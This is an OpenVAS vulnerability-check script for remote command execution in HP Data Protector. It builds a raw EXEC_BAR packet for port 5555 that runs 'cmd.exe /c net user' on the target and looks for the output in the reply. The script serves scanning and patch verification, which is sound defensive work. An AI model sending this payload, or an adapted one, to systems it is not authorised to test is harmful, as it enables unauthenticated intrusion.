###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_multiple_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# HP (OpenView Storage) Data Protector Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804402");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-2344", "CVE-2013-2345", "CVE-2013-2346", "CVE-2013-2347",
                "CVE-2013-2348", "CVE-2013-2349", "CVE-2013-2350", "CVE-2013-6195",
                "CVE-2011-0923", "CVE-2014-2623");
  script_bugtraq_id(64647, 64647, 64647, 64647, 64647, 64647, 64647, 64647, 46234);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-18 16:03:46 +0530 (Tue, 18 Feb 2014)");
  script_name("HP (OpenView Storage) Data Protector Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("hp_data_protector/installed");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2014/Jan/7");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125246");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-001");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-002");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-003");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-004");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-005");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-006");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-007");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-008");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-009");
  script_xref(name:"URL", value:"http://h20565.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c03822422");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass certain security
  restrictions, manipulate certain data, and compromise a vulnerable system.");
  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector v6.2X, v7.X, v8.X and v9.X");
  script_tag(name:"insight", value:"Multiple flaws are due to,

  - An error within OmniInet.exe when handling certain messages can be exploited
  to access otherwise restricted files by sending a specially crafted request
  to TCP port 5555.

  - A boundary error within rrda.exe, vbda.exe, vrda.exe, rbda.exe when
  processing rrda request messages can be exploited to cause
  a stack-based buffer overflow.

  - An error within OmniInet.exe when handling certain messages can be exploited
  to execute arbitrary commands by sending specially crafted EXEC_BAR packet
  to TCP port 5555.

  - A boundary error within crs.exe when parsing opcodes 214, 215, 216, 219, 257,
  and 263 can be exploited to a cause stack-based buffer overflow.");
  script_tag(name:"summary", value:"The host is running HP (OpenView Storage) Data Protector and is prone to multiple
  vulnerabilities.");
  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");
  script_tag(name:"vuldetect", value:"Construct the crafted TCP request with command and check it is possible
  to execute the command");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818");
  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

# nb: Attack string: 'c:\windows\system32\cmd.exe' '/c net user usr p@ss!23 /help'
hdpReq = raw_string(
        0x00, 0x00, 0x01, 0x3c, 0xff, 0xfe, 0x32, 0x00,
        0x00, 0x00, 0x20, 0x00, 0x68, 0x00, 0x70, 0x00,
        0x64, 0x00, 0x70, 0x00, 0x31, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x30, 0x00, 0x00, 0x00, 0x20, 0x00,
        0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00,
        0x45, 0x00, 0x4e, 0x00, 0x55, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x31, 0x00, 0x31, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x45, 0x00, 0x58, 0x00, 0x45, 0x00,
        0x43, 0x00, 0x5f, 0x00, 0x42, 0x00, 0x41, 0x00,
        0x52, 0x00, 0x00, 0x00, 0x20, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x00, 0x00, 0x20, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x00, 0x00, 0x20, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x00, 0x00, 0x20, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x00, 0x00, 0x20, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x00, 0x00,
        0x20, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
        0x41, 0x00, 0x00, 0x00, 0x20, 0x00, 0x63, 0x00,
        0x3a, 0x00, 0x5c, 0x00, 0x77, 0x00, 0x69, 0x00,
        0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00,
        0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00,
        0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00,
        0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00,
        0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00,
        0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x20, 0x00,
        0x00, 0x00, 0x20, 0x00, 0x2f, 0x00, 0x63, 0x00,
        0x20, 0x00, 0x6e, 0x00, 0x65, 0x00, 0x74, 0x00,
        0x20, 0x00, 0x75, 0x00, 0x73, 0x00, 0x65, 0x00,
        0x72, 0x00, 0x20, 0x00, 0x75, 0x00, 0x73, 0x00,
        0x72, 0x00, 0x20, 0x00, 0x70, 0x00, 0x40, 0x00,
        0x73, 0x00, 0x73, 0x00, 0x21, 0x00, 0x32, 0x00,
        0x33, 0x00, 0x20, 0x00, 0x2f, 0x00, 0x68, 0x00,
        0x65, 0x00, 0x6c, 0x00, 0x70, 0x00, 0x0d, 0x00,
        0x0a, 0x00, 0x0d, 0x00, 0x0a, 0x00, 0x00, 0x00,
        0x00, 0x00);

send( socket:soc, data:hdpReq );

sleep( 7 );

hdpRes = recv( socket:soc, length:4096 );

len = strlen( hdpRes );
if( ! len ) exit( 0 );

for( i = 0; i < len; i = i + 1 ) {
  if( ( ord( hdpRes[i] ) >= 61 ) ) {
    hdpData = hdpData + hdpRes[i];
  }
}

close( soc );

if( "NETUSER" >< hdpData && "viewThenameoftheuseraccountcanhave" >< hdpData ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );